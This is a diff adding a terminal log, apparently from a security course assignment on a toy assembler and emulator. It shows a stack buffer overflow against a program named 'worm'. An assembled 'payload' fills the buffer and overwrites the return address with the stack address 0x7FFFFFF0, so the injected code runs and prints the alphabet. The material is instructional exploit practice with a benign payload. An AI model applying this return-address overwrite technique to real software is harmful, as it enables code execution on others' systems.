@@ -1,0 +1,69 @@
+
+
+21:34 ~/assignment >prep worm
+ok
+21:34 ~/assignment >run worm
+asdjfksj
+byte i = 0	 string = 666A6B73	 @string = 7FFFFFF0
+byte i = 1	 string = 006A736B	 @string = 7FFFFFF1
+byte i = 2	 string = 00000000	 @string = 7FFFFFF2
+byte i = 3	 string = 00000000	 @string = 7FFFFFF3
+byte i = 4	 string = 00000000	 @string = 7FFFFFF4
+byte i = 5	 string = 00000000	 @string = 7FFFFFF5
+byte i = 6	 string = 00000000	 @string = 7FFFFFF6
+byte i = 7	 string = 00000000	 @string = 7FFFFFF7
+byte i = 8	 string = 00000000	 @string = 7FFFFFF8
+byte i = 9	 string = 00000000	 @string = 7FFFFFF9
+byte i = 10	 string = 7FFFFFFD	 @string = 7FFFFFFA
+byte i = 11	 string = 00000445	 @string = 7FFFFFFB
+Doesn't work
+21:36 ~/assignment >assemble -l payload.ass
+   LOOP         = 00000001, relative
+        1: 
+        2:       .makeexe
+        3: 
+        4:       load r1, 'A'
+   0000: 02100041 
+        5: loop: type r1
+   0001: 88010000 
+        6:       add  r1, 1
+   0002: 0C100001 
+        7:       comp r1, 'Z'
+   0003: 2810005A 
+        8:       jcond leq, loop
+   0004: 3A3FFFFC 
+        9:       type '\'
+   0005: 88000027 
+       10:       .data 0x12345678
+   0006: 12345678 
+       11:       .data 0x12345678
+   0007: 12345678 
+       12:       .data 0x12345678
+   0008: 12345678 
+       13:       .data 0x12345678
+   0009: 12345678 
+       14:       .data 0x12345678
+   000A: 12345678 
+       15:       .data 0x7FFFFFF0
+   000B: 7FFFFFF0 
+       16:       type '\n'
+   000C: 8800000A 
+21:36 ~/assignment>>run worm -in=payload.exe
+A�
+       Z(��?:'�xV4xV4xV4xV4xV4���
+byte i = 0	 string = 02100041	 @string = 7FFFFFF0
+byte i = 1	 string = 88010000	 @string = 7FFFFFF1
+byte i = 2	 string = 0C100001	 @string = 7FFFFFF2
+byte i = 3	 string = 2810005A	 @string = 7FFFFFF3
+byte i = 4	 string = 3A3FFFFC	 @string = 7FFFFFF4
+byte i = 5	 string = 88000027	 @string = 7FFFFFF5
+byte i = 6	 string = 12345678	 @string = 7FFFFFF6
+byte i = 7	 string = 12345678	 @string = 7FFFFFF7
+byte i = 8	 string = 12345678	 @string = 7FFFFFF8
+byte i = 9	 string = 12345678	 @string = 7FFFFFF9
+byte i = 10	 string = 12345678	 @string = 7FFFFFFA
+byte i = 11	 string = 7FFFFFF0	 @string = 7FFFFFFB
+ABCDEFGHIJKLMNOPQRSTUVWXYZ'21:36 ~/assignment >
+21:36 ~/assignment >
+
+
